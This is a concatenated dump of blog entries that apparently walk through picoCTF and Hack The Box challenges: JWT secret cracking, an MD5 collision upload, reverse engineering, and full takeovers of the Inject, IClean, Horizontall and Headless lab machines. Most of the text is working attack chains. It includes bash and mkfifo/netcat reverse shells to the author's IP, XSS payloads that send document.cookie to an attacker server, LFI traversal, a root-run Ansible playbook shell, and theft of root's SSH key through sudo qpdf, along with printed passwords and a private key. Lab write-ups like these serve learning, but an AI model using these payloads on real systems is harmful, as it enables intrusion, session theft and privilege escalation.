--wordlist=/usr/share/wordlists/rockyou.txt token.txtUsing default input encoding: UTF-8Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 256/256 AVX2 8x])Will run 8 OpenMP threadsPress 'q' or Ctrl-C to abort, almost any other key for statusilovepico (?)1g 0:00:00:00 DONE (2024-07-22 19:01) 1.010g/s 7480Kp/s 7480Kc/s 7480KC/s ilovetitor..ilovejesus789Use the \"--show\" option to display all of the cracked passwords reliablySession completed.There it is the password: ilovepico go to jwt.io and fill the password in and also change the name to admin:and use curlor burpsuiteto change the cookie, i used curl because it’s faster:$ curl http://jupiter.challenges.picoctf.org:63090/ --cookie \"jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDbEe_JYEZTN19Vx6X9NNZtRVbKPBkhO-s\" | grep pico % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed100 1291 100 1291 0 0 2991 0 --:--:-- --:--:-- --:--:-- 2988\t\t\t\t\t&lt;textarea style=\"margin: 0 auto; display: block;\"&gt;picoCTF{jawt_was_just_what_you_thought_f859ab2f}&lt;/textarea&gt;And that’s the flag:picoCTF{jawt_was_just_what_you_thought_f859ab2f}" }, { "title": "It Is My Birthday from PicoCTF", "url": "/posts/It-is-my-Birthday-from-PicoCTF/", "categories": "PicoCTF", "tags": "PicoCTF", "date": "2024-09-06 00:00:00 +0000", "snippet": "It Is My Birthday from PicoCTFpage DescriptionI sent out 2 invitations to all of my friends for my birthday! I’ll know if they get stolen because the two invites look similar, and they even have the same md5 hash, but they are slightly different! You wouldn’t believe how long it took me to find a collision. Anyway, see if you’re invited by submitting 2 PDFs to my website. http://mercury.picoctf.net:11590/based on this description we have to search some file that has two identical MD5 hash. After bit of a search i found this site about MD5 collision and it has two files. Windows version: hello.exe. MD5 Sum: cdc47d670159eef60916ca03a9d4a007 erase.exe. MD5 Sum: cdc47d670159eef60916ca03a9d4a007 Linux version (i386): hello. MD5 Sum: da5c61e1edc0f18337e46418e48c1290 erase. MD5 Sum: da5c61e1edc0f18337e46418e48c1290 i downloaded it and changed the name of it to hello.pdf erase.pdfbecause site only takes files that is “.pdf” I uploaded it and got this:&lt;?php if (isset($_POST[\"submit\"])) {    $type1 = $_FILES[\"file1\"][\"type\"];    $type2 = $_FILES[\"file2\"][\"type\"];    $size1 = $_FILES[\"file1\"][\"size\"];    $size2 = $_FILES[\"file2\"][\"size\"];    $SIZE_LIMIT = 18 * 1024;     if (($size1 &lt; $SIZE_LIMIT) &amp;&amp; ($size2 &lt; $SIZE_LIMIT)) {         if (($type1 == \"application/pdf\") &amp;&amp; ($type2 == \"application/pdf\")) {            $contents1 = file_get_contents($_FILES[\"file1\"][\"tmp_name\"]);            $contents2 = file_get_contents($_FILES[\"file2\"][\"tmp_name\"]);             if ($contents1 != $contents2) {                 if (md5_file($_FILES[\"file1\"][\"tmp_name\"]) == md5_file($_FILES[\"file2\"][\"tmp_name\"])) {                    highlight_file(\"index.php\");                     die();                 } else {                     echo \"MD5 hashes do not match!\";                     die();                 }             } else {                 echo \"Files are not different!\";                 die();             }         } else {             echo \"Not a PDF!\";             die();         }     } else {         echo \"File too large!\";         die();     } } // FLAG: picoCTF{c0ngr4ts_u_r_1nv1t3d_3d3e4c57} ?&gt; &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt;     &lt;title&gt;It is my Birthday&lt;/title&gt;     &lt;link href=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css\" rel=\"stylesheet\"&gt;     &lt;link href=\"https://getbootstrap.com/docs/3.3/examples/jumbotron-narrow/jumbotron-narrow.css\" rel=\"stylesheet\"&gt;     &lt;script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js\"&gt;&lt;/script&gt;     &lt;script src=\"https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js\"&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt;     &lt;div class=\"container\"&gt;         &lt;div class=\"header\"&gt;             &lt;h3 class=\"text-muted\"&gt;It is my Birthday&lt;/h3&gt;         &lt;/div&gt;         &lt;div class=\"jumbotron\"&gt;             &lt;p class=\"lead\"&gt;&lt;/p&gt;             &lt;div class=\"row\"&gt;                 &lt;div class=\"col-xs-12 col-sm-12 col-md-12\"&gt;                     &lt;h3&gt;See if you are invited to my party!&lt;/h3&gt;                 &lt;/div&gt;             &lt;/div&gt;             &lt;br/&gt;             &lt;div class=\"upload-form\"&gt;                 &lt;form role=\"form\" action=\"/index.php\" method=\"post\" enctype=\"multipart/form-data\"&gt;                 &lt;div class=\"row\"&gt;                     &lt;div class=\"form-group\"&gt;                         &lt;input type=\"file\" name=\"file1\" id=\"file1\" class=\"form-control input-lg\"&gt;                         &lt;input type=\"file\" name=\"file2\" id=\"file2\" class=\"form-control input-lg\"&gt;                     &lt;/div&gt;                 &lt;/div&gt;                 &lt;div class=\"row\"&gt;                     &lt;div class=\"col-xs-12 col-sm-12 col-md-12\"&gt;                         &lt;input type=\"submit\" class=\"btn btn-lg btn-success btn-block\" name=\"submit\" value=\"Upload\"&gt;                     &lt;/div&gt;                 &lt;/div&gt;                 &lt;/form&gt;             &lt;/div&gt;         &lt;/div&gt;     &lt;/div&gt;     &lt;footer class=\"footer\"&gt;         &lt;p&gt;&amp;copy; PicoCTF&lt;/p&gt;     &lt;/footer&gt; &lt;/div&gt; &lt;script&gt; $(document).ready(function(){     $(\".close\").click(function(){         $(\"myAlert\").alert(\"close\");     }); }); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt;There is our flag: picoCTF{c0ngr4ts_u_r_1nv1t3d_3d3e4c57}" }, { "title": "Inject from HTB", "url": "/posts/Inject-from-HTB/", "categories": "Hack The Box", "tags": "Hack The Box", "date": "2024-09-06 00:00:00 +0000", "snippet": "Inject from HTBnmapgave this:22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 ca:f1:0c:51:5a:59:62:77:f0:a8:0c:5c:7c:8d:da:f8 (RSA)| 256 d5:1c:81:c9:7b:07:6b:1c:c1:b4:29:25:4b:52:21:9f (ECDSA)|_ 256 db:1d:8c:eb:94:72:b0:d3:ed:44:b9:6c:93:a7:f9:1d (ED25519)8080/tcp open nagios-nsca Nagios NSCA|_http-title: HomeAccess the port 8080and see that it has uploadwhich only takes imagesupload image and click view your imageand in urlyou can see this:http://10.10.11.204:8080/show_image?img=something_somethingIt means that it takes imageyou uploaded. It’s LFIexploitable. So go to burpsuiteand do LFIattack. After some exploring versioncan be found in hereGET /show_image?img=../../../../../../var/www/WebApp/pom.xml HTTP/1.1Here is the version:&lt;dependency&gt;\t\t\t&lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;\t\t\t&lt;artifactId&gt;spring-cloud-function-web&lt;/artifactId&gt;\t\t\t&lt;version&gt;3.2.2&lt;/version&gt;\t\t&lt;/dependency&gt;Search shows it is exploitable and i found an RCE codeto get reverse shell in github:https://github.com/randallbanner/Spring-Cloud-Function-Vulnerability-CVE-2022-22963-RCE/blob/main/spring-cloud-rce.pyyou must configure the code to your IP, PORT and MACHINE IPThen start NetCatlistener on port you want and execute the code.python3 spring-cloud-rce-3.2.2.py[+] Serving on port 8000[!] Press Ctrl+C to stop the server[+] Creating shell.sh in current Directory...[++] Done[+] Sending shell to /dev/shm/shell.sh...[++] Done[+] Giving the server time to process...\tz z z z z10.10.11.204 - - [12/Aug/2024 19:49:38] \"GET /shell.sh HTTP/1.1\" 200 -\tz z z z\tz z z\tz z\tz[++] Countdown finished![+] Making the shell executable...[++] Done[+] Executing shell...[+] Server stopped. rlwrap nc -nlvp 1234listening on [any] 1234 ...connect to [10.10.16.5] from (UNKNOWN) [10.10.11.204] 56412/bin/sh: 0: can't access tty; job control turned off$ script /dev/null -c bashScript started, file is /dev/nullfrank@inject:/$We are in.Password for other user is located in /home/frank/.m2/settings.xmlread it and get the password.it is: DocPhillovestoInject123**User Flag is: feb816665bae93aa3a60ee369df26a17**Then download pspy64son machine and run it. There is cronjobwhich you will use to do privilege escalation../pspy64s.................................................2024/08/12 16:30:01 CMD: UID=0 PID=5639 | /bin/sh -c /usr/local/bin/ansible-parallel /opt/automation/tasks/*.yml2024/08/12 16:30:01 CMD: UID=0 PID=5638 | /bin/sh -c sleep 10 &amp;&amp; /usr/bin/rm -rf /opt/automation/tasks/* &amp;&amp; /usr/bin/cp /root/playbook_1.yml /opt/automation/tasks/So there is an /usr/local/bin/ansible-parallelwhich runs *.ymlfiles located in /opt/automation/tasks/directory. UID=0which means this command is run by root.So if we do reverse shell we will be root.create an reverse.yml in /opt/automation/tasks/ with commands:- hosts: localhost tasks: - name: Checking webapp service shell: cmd: bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;your_IP&gt;/&lt;port&gt; 0&gt;&amp;1'And wait for it to be executed. DONT FORGET to set netcat listenernc -nlvp 9001listening on [any] 9001 ...connect to [10.10.16.5] from (UNKNOWN) [10.10.11.204] 33378bash: cannot set terminal process group (8039): Inappropriate ioctl for devicebash: no job control in this shellroot@inject:/opt/automation/tasks#Root Flag is: ffae042f498cf72f0d7017c6bcd21d3f***" }, { "title": "IClean from HTB", "url": "/posts/IClean-from-HTB/", "categories": "Hack The Box", "tags": "Hack The Box", "date": "2024-09-06 00:00:00 +0000", "snippet": "IClean from HTBpageNmap gave this:$ nmap -sCV --min-rate 4000 -Pn 10.10.11.12Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-03 17:05 +04Stats: 0:00:24 elapsed; 0 hosts completed (1 up), 1 undergoing Script ScanNSE Timing: About 87.50% done; ETC: 17:05 (0:00:00 remaining)Nmap scan report for capiclean.htb (10.10.11.12)Host is up (0.25s latency).Not shown: 986 filtered tcp ports (no-response)PORT STATE SERVICE VERSION21/tcp closed ftp23/tcp closed telnet25/tcp closed smtp53/tcp closed domain80/tcp open http Apache httpd 2.4.52 ((Ubuntu))|_http-title: Capiclean| http-server-header:| Apache/2.4.52 (Ubuntu)|_ Werkzeug/2.3.7 Python/3.10.12110/tcp closed pop3139/tcp closed netbios-ssn199/tcp closed smux445/tcp closed microsoft-ds587/tcp closed submission995/tcp closed pop3s1025/tcp closed NFS-or-IIS3306/tcp closed mysql3389/tcp closed ms-wbt-serverService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 25.38 secondsNothing unusual.First add the site to /etc/hosts:10.10.11.12 capiclean.htbThen access the site. There is send quote link. Go to that and then we have to use XSSto steal the cookie with BurpSuite:Turn on the Interceptand before you send the emailyou need to intercept and change the email you send with XSSscript to get the cookie:&lt;img src=x onerror=fetch(\"http://10.10.16.47:8888/\"+document.cookie)&gt; ----- XSS script%3Cimg%20src%3Dx%20onerror%3Dfetch(%22http%3A%2F%2F10.10.16.47%3A8888%2F%22%2Bdocument.cookie)%3E ---- encoded XSS scriptpython3 -m http.server 8888 ---- simple http python serverBurpSuitepayload:POST /sendMessage HTTP/1.1Host: capiclean.htbContent-Length: 127Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://capiclean.htbContent-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8Sec-GPC: 1Accept-Language: en-US,en;q=0.7Referer: http://capiclean.htb/quoteAccept-Encoding: gzip, deflate, brCookie: session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.Zq3t1A.JQgksxu10czAnKBw5RbDWWe_-XkConnection: keep-aliveservice=%3Cimg%20src%3Dx%20onerror%3Dfetch(%22http%3A%2F%2F10.10.16.47%3A8888%2F%22%2Bdocument.cookie)%3E&amp;email=test%40test.comAnd on the simple http serveri got the cookie:$ python3 -m http.server 8888Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...10.10.11.12 - - [03/Aug/2024 17:19:57] \"GET /?session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.Zq3t1A.JQgksxu10czAnKBw5RbDWWe_-Xk HTTP/1.1\" 200 -10.10.11.12 - - [03/Aug/2024 17:19:58] \"GET /?session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.Zq3t1A.JQgksxu10czAnKBw5RbDWWe_-Xk HTTP/1.1\" 200 -10.10.11.12 - - [03/Aug/2024 17:20:00] \"GET /?session=eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.Zq3t1A.JQgksxu10czAnKBw5RbDWWe_-Xk HTTP/1.1\" 200 -Go to http://capiclean.htb/loginand with cookieEditor add this:Then go to http://capiclean.htb/dashboardand go to generateInvoice, click generate and copy what you will get:Then go to QRgeneratorand enter your invoice ID to get the link:After that you need to turn intercepton and modify what you will send. You need to get reverse shell from this.The payload is:Here is the explanation: chatgptits with my IP and port.Don’t forget NetCat$ nc -nlvp 1234And after sending that payload in Repeateryou will get the connection.$ nc -nlvp 1234listening on [any] 1234 ...connect to [10.10.16.47] from (UNKNOWN) [10.10.11.12] 37226sh: 0: can't access tty; job control turned off$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'www-data@iclean:/opt/app$www-data@iclean:/opt/app$ lslsapp.py\tstatic\ttemplatesThere is app.py, lets read it. At the start there is the thing we need:www-data@iclean:/opt/app$ cat appcat app.pyfrom flask import Flask, render_template, request, jsonify, make_response, session, redirect, url_forfrom flask import render_template_stringimport pymysqlimport hashlibimport osimport random, stringimport pyqrcodefrom jinja2 import StrictUndefinedfrom io import BytesIOimport re, requests, base64app = Flask(__name__)app.config['SESSION_COOKIE_HTTPONLY'] = Falsesecret_key = ''.join(random.choice(string.ascii_lowercase) for i in range(64))app.secret_key = secret_key# Database Configurationdb_config = { 'host': '127.0.0.1', 'user': 'iclean', 'password': 'pxCsmnGLckUb', 'database': 'capiclean'This means that there is Databasewith password:pxCsmnGLckUb. I connected to it and got this:www-data@iclean:/opt/app$ mysql -u iclean -pmysql -u iclean -pEnter password: pxCsmnGLckUbWelcome to the MySQL monitor. Commands end with ; or \\g.Your MySQL connection id is 785Server version: 8.0.36-0ubuntu0.22.04.1 (Ubuntu)Copyright (c) 2000, 2024, Oracle and/or its affiliates.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.mysql&gt; lsls -&gt; ;;ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'ls' at line 1mysql&gt; show databases;show databases;+--------------------+| Database |+--------------------+| capiclean || information_schema || performance_schema |+--------------------+3 rows in set (0.01 sec)mysql&gt; use capicleanuse capicleanReading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -ADatabase changedmysql&gt; show tables;show tables;+---------------------+| Tables_in_capiclean |+---------------------+| quote_requests || services || users |+---------------------+3 rows in set (0.00 sec)mysql&gt; select * from users;select * from users;admin —- 2ae316f10d49222f369139ce899e414e57ed9e339bb75457446f2ba8628a6e51consuela —- 0a298fdd4d546844ae940357b631e40bf2a7847932f82c494daa1c9c5d6927aaLet’s crack the consuelapassword in crackstation and you will get the password:simple and clean.adminpassword is not crack-able.Then exit mysqland change the user to consuela:mysql&gt; exitexitByewww-data@iclean:/opt/app$ su consuelasu consuelaPassword: simple and cleanconsuela@iclean:/opt/app$ $ cd /home/consuelacd /home/consuelaconsuela@iclean:~$ lslsuser.txtconsuela@iclean:~$ cat user.txtcat user.txt05fa5137fbd54cfbdb6180d933f83c89user flag: 05fa5137fbd54cfbdb6180d933f83c89***Learn what we can run as root:$ sudo -lsudo -l[sudo] password for consuela: simple and cleanMatching Defaults entries for consuela on iclean: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_ptyUser consuela may run the following commands on iclean: (ALL) /usr/bin/qpdfBecause there is sshport open let’s copy id_rsaof ssh with qpdf:$ sudo /usr/bin/qpdf --empty /tmp/rsa.txt --qdf -add-attachment /root/.ssh/id_rsa --sudo /usr/bin/qpdf --empty /tmp/rsa.txt --qdf -add-attachment /root/.ssh/id_rsa --$ cat /tmp/rsa.txt-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS1zaGEyLW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQQMb6Wn/o1SBLJUpiVfUaxWHAE64hBNvX1ZjgJ9wc9nfjEqFS+jAtTyEljTqB+DjJLtRfP4N40SdoZ9yvekRQDRAAAAqGOKt0ljirdJAAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAxvpaf+jVIEslSmJV9RrFYcATriEE29fVmOAn3Bz2d+MSoVL6MC1PISWNOoH4OMku1F8/g3jRJ2hn3K96RFANEAAAAgK2QvEb+leR18iSesuyvCZCW1mI+YDL7sqwb+XMiIE/4AAAALcm9vdEBpY2xlYW4BAgMEBQ==-----END OPENSSH PRIVATE KEY-----qpdfCopy this OPENSSHprivate key to some file that you will be needing to use while connecting to sshas a root.$ cat rsa &lt; -----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS1zaGEyLW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQQMb6Wn/o1SBLJUpiVfUaxWHAE64hBNvX1ZjgJ9wc9nfjEqFS+jAtTyEljTqB+DjJLtRfP4N40SdoZ9yvekRQDRAAAAqGOKt0ljirdJAAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAxvpaf+jVIEslSmJV9RrFYcATriEE29fVmOAn3Bz2d+MSoVL6MC1PISWNOoH4OMku1F8/g3jRJ2hn3K96RFANEAAAAgK2QvEb+leR18iSesuyvCZCW1mI+YDL7sqwb+XMiIE/4AAAALcm9vdEBpY2xlYW4BAgMEBQ==-----END OPENSSH PRIVATE KEY-----$ chmod 600 rsa$ ssh -i rsa root@10.10.11.12The authenticity of host '10.10.11.12 (10.10.11.12)' can't be established.ED25519 key fingerprint is SHA256:3nZua2j9n72tMAHW1xkEyDq3bjYNNSBIszK1nbQMZfs.This key is not known by any other names.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added '10.10.11.12' (ED25519) to the list of known hosts.Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/pro System information as of Sat Aug 3 12:44:17 PM UTC 2024Expanded Security Maintenance for Applications is not enabled.3 updates can be applied immediately.To see these additional updates run: apt list --upgradableEnable ESM Apps to receive additional future security updates.See https://ubuntu.com/esm or run: sudo pro statusThe list of available updates is more than a week old.To check for new updates run: sudo apt updateroot@iclean:~# cat root.txt09bab030cd79f2a2553346f92ddf4c49root flag: 09bab030cd79f2a2553346f92ddf4c49***" }, { "title": "Hurry Up! Wait! from PicoCTF", "url": "/posts/Hurry-up!-Wait!-from-PicoCTF/", "categories": "PicoCTF", "tags": "PicoCTF", "date": "2024-09-06 00:00:00 +0000", "snippet": "Hurry Up! Wait! from PicoCTFpage Descriptionsvchost.exeLooking at this CTF category we see that it’s reverse engineering, but lets run the program.For some reason i cant run it i.g. because i’m on Kali i can’t run it. But this program will take forever to run for some reason.Let’s go to Ghidra my beloved reverse engineering tool.Scrolling trough functions we see some unusual function named undefined FUN_0010298a() ************************************************************** * FUNCTION * ************************************************************** undefined FUN_0010298a() undefined AL:1 &lt;RETURN&gt; FUN_0010298a XREF[3]: FUN_00101fcc:0010201a(c), 00102ea0, 00103588(*) 0010298a 55 PUSH RBP 0010298b 48 89 e5 MOV RBP,RSP 0010298e 48 bf 00 MOV RDI,0x38d7ea4c68000 80 c6 a4 7e 8d 03 00 00102998 e8 d3 f1 CALL &lt;EXTERNAL&gt;::ada__calendar__delays__delay_for undefined ada__calendar__delays_ ff ff 0010299d e8 74 fc CALL FUN_00102616 undefined FUN_00102616() ff ff 001029a2 e8 03 fb CALL FUN_001024aa undefined FUN_001024aa() ff ff 001029a7 e8 c6 f9 CALL FUN_00102372 undefined FUN_00102372() ff ff 001029ac e8 31 fc CALL FUN_001025e2 undefined FUN_001025e2() ff ff 001029b1 e8 9c fe CALL FUN_00102852 undefined FUN_00102852() ff ff 001029b6 e8 cb fe CALL FUN_00102886 undefined FUN_00102886() ff ff 001029bb e8 fa fe CALL FUN_001028ba undefined FUN_001028ba() ff ff 001029c0 e8 5d ff CALL FUN_00102922 undefined FUN_00102922() ff ff 001029c5 e8 dc f9 CALL FUN_001023a6 undefined FUN_001023a6() ff ff 001029ca e8 67 f7 CALL FUN_00102136 undefined FUN_00102136() ff ff 001029cf e8 32 f8 CALL FUN_00102206 undefined FUN_00102206() ff ff 001029d4 e8 31 f9 CALL FUN_0010230a undefined FUN_0010230a() ff ff 001029d9 e8 28 f8 CALL FUN_00102206 undefined FUN_00102206() ff ff 001029de e8 97 fb CALL FUN_0010257a undefined FUN_0010257a() ff ff 001029e3 e8 06 ff CALL FUN_001028ee undefined FUN_001028ee() ff ff 001029e8 e8 21 fa CALL FUN_0010240e undefined FUN_0010240e() ff ff 001029ed e8 f4 fc CALL FUN_001026e6 undefined FUN_001026e6() ff ff 001029f2 e8 8b fd CALL FUN_00102782 undefined FUN_00102782() ff ff 001029f7 e8 f2 fe CALL FUN_001028ee undefined FUN_001028ee() ff ff 001029fc e8 a5 f9 CALL FUN_001023a6 undefined FUN_001023a6() ff ff 00102a01 e8 08 fa CALL FUN_0010240e undefined FUN_0010240e() ff ff 00102a06 e8 33 f9 CALL FUN_0010233e undefined FUN_0010233e() ff ff 00102a0b e8 96 f9 CALL FUN_001023a6 undefined FUN_001023a6() ff ff 00102a10 e8 5d f9 CALL FUN_00102372 undefined FUN_00102372() ff ff 00102a15 e8 ec f7 CALL FUN_00102206 undefined FUN_00102206() ff ff 00102a1a e8 87 f9 CALL FUN_001023a6 undefined FUN_001023a6() ff ff 00102a1f e8 32 ff CALL FUN_00102956 undefined FUN_00102956() ff ffAt start we can see why this program delays to run.ada__calendar__delays__delay_for(1000000000000000);Let’s move on examining the functions.Clicking to first functionvoid FUN_00102616(void){ ada__text_io__put__4(&amp;DAT_00102cd8,&amp;DAT_00102cb8); return;}something named ada__text_io__put__4 inputs a text.(&amp;DAT_00102cd8,&amp;DAT_00102cb8)Lets examine DAT_00102cd8 and program takes us to letter “p”. &amp;DAT_00102cb8 gives us “01H” i don’t know what it is but we don’t need it.Let’s go to next functionvoid FUN_001024aa(void){ ada__text_io__put__4(&amp;DAT_00102cd1,&amp;DAT_00102cb8); return;}&amp;DAT_00102cd1 gives us “i”.move on to next function.void FUN_00102372(void){ ada__text_io__put__4(&amp;DAT_00102ccb,&amp;DAT_00102cb8); return;}&amp;DAT_00102ccb —&gt; “c”. Now we know that we’re dealing with the flag. I don’t have that much knowledge to automate the process so im going to go trough all the functions and we get the flag: picoCTF{d15a5m_ftw_dfbdc5d}" }, { "title": "Horizontal from HTB", "url": "/posts/Horizontall-from-HTB/", "categories": "Hack The Box", "tags": "Hack The Box", "date": "2024-09-06 00:00:00 +0000", "snippet": "Horizontall from HTBon site app.......jsshowed this:methods: { getReviews: function() { var t = this; r.a.get(\"http://api- prod.horizontall.htb/reviews\").then((function(s) { return t.reviews = s.data } )) } } }Let’s add this subdomain to /etc/hostsgobustergave this/reviews (Status: 200) [Size: 507]/users (Status: 403) [Size: 60]/admin (Status: 200) [Size: 854]/%c0 (Status: 400) [Size: 69]the /adminshows that it runs on strapisearchsploit strapi-------------------------------------------------------- --------------------------------- Exploit Title | Path-------------------------------------------------------- ---------------------------------Strapi 3.0.0-beta - Set Password (Unauthenticated) | multiple/webapps/50237.pyStrapi 3.0.0-beta.17.7 - Remote Code Execution (RCE) (A | multiple/webapps/50238.pyStrapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE | multiple/webapps/50239.pyStrapi CMS 3.0.0-beta.17.4 - Set Password (Unauthentica | nodejs/webapps/50716.rbThen download it:searchsploit -m multiple/webapps/50239.py Exploit: Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated) URL: https://www.exploit-db.com/exploits/50239 Path: /usr/share/exploitdb/exploits/multiple/webapps/50239.py Codes: N/A Verified: FalseFile Type: Python script, ASCII text executableCopied to: /home/giorgi/50239.pyThen execute it. python3 strapi-50239.py http://api-prod.horizontall.htb[+] Checking Strapi CMS Version running[+] Seems like the exploit will work!!![+] Executing exploit[+] Password reset was successfully[+] Your email is: admin@horizontall.htb[+] Your new credentials are: admin:SuperStrongPassword1[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNzI0NDg4NTk0LCJleHAiOjE3MjcwODA1OTR9.6LTKqQv8t-0-v9GxJ9m8kV1fjnGI3Semgn07f5D2j9A$&gt; bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.7/1234 0&gt;&amp;1'In netcatrlwrap nc -nvlp 1234listening on [any] 1234 ...connect to [10.10.16.7] from (UNKNOWN) [10.10.11.105] 39506bash: cannot set terminal process group (2009): Inappropriate ioctl for devicebash: no job control in this shellstrapi@horizontall:~/myapi$User Flag is: e8c0ec1b4cac6c52e7c922f854fbc078***ss -tlnpState Recv-Q Send-Q Local Address:Port Peer Address:PortLISTEN 0 128 0.0.0.0:22 0.0.0.0:*LISTEN 0 128 127.0.0.1:1337 0.0.0.0:* users:((\"node\",pid=2009,fd=31))LISTEN 0 128 127.0.0.1:8000 0.0.0.0:*LISTEN 0 80 127.0.0.1:3306 0.0.0.0:*use curlto learn what are on this portsstrapi@horizontall:~$ curl 127.0.0.1:8000curl 127.0.0.1:8000&lt;!DOCTYPE html&gt;&lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"&gt;Let’s forward the port with sshssh -i id_rsa -L 8000:localhost:8000 strapi@10.10.11.105then access it127.0.0.1:8000It is an laravel v8, searching exploit on it we can find github repositorywhich allows RCEand we can get reverse shellhttps://github.com/ambionics/laravel-exploitsrunning this code now can give reverse shellin which we will be root python3 laravel-8.py http://localhost:8000 Monolog/RCE1 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.16.7 1234 &gt;/tmp/f'now on netcatrlwrap nc -nvlp 1234listening on [any] 1234 ...connect to [10.10.16.7] from (UNKNOWN) [10.10.11.105] 39600sh: 0: can't access tty; job control turned off#Root Flag is: a5140c79b048ef0a495489d211c7852d***" }, { "title": "Headless from HTB", "url": "/posts/Headless-from-HTB/", "categories": "Hack The Box", "tags": "Hack The Box", "date": "2024-09-06 00:00:00 +0000", "snippet": "Headless from HTBpageNmapgave this:$ nmap -sCV --min-rate 4000 -p- 10.10.11.8Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-07 23:00 +04Warning: 10.10.11.8 giving up on port because retransmission cap hit (10).Stats: 0:00:13 elapsed; 0 hosts completed (1 up), 1 undergoing Connect ScanConnect Scan Timing: About 26.55% done; ETC: 23:01 (0:00:36 remaining)Nmap scan report for 10.10.11.8Host is up (0.089s latency).Not shown: 57469 closed tcp ports (conn-refused), 8065 filtered tcp ports (no-response)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)| ssh-hostkey:| 256 90:02:94:28:3d:ab:22:74:df:0e:a3:b2:0f:2b:c6:17 (ECDSA)|_ 256 2e:b9:08:24:02:1b:60:94:60:b3:84:a9:9e:1a:60:ca (ED25519)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelNothing unusual.I went to the site and it displayed time and after that site will be live. We’ll imma say i ain't waitin allat(trash ahh joke) And started exploiting. There is /supportdirectory, which allows me to send message. I tried XSSby typing&lt;script&gt;alert(1)&lt;/script&gt;In comment section.I was caught doing that.But what if i tried Interceptingwith BurpSuite? Will it work? Yeah it will work.I’m tired of typing this Walktroughsso i’m gonna go straight to point:python3 -m http.server 8000 # start simple serverThen modify BurpSuitelike this while intercept is on:POST /support HTTP/1.1Host: 10.10.11.8:5000Content-Length: 98Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://10.10.11.8:5000Content-Type: application/x-www-form-urlencodedUser-Agent: &lt;script&gt;var i=new Image(); i.src=\"http://10.10.16.3:8000/?cookie=\"+btoa(document.cookie);&lt;/script&gt;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8Sec-GPC: 1Accept-Language: en-US,enReferer: http://10.10.11.8:5000/supportAccept-Encoding: gzip, deflate, brCookie: is_admin=InVzZXIi.uAlmXlTvm8vyihjNaPDWnvB_ZfsConnection: keep-alivefname=aa&amp;lname=bb&amp;email=test%40test.com&amp;phone=1231&amp;message=%3Cscript%3Ealert%281%29%3C%2Fscript%3EIf you’r lazy to read here is 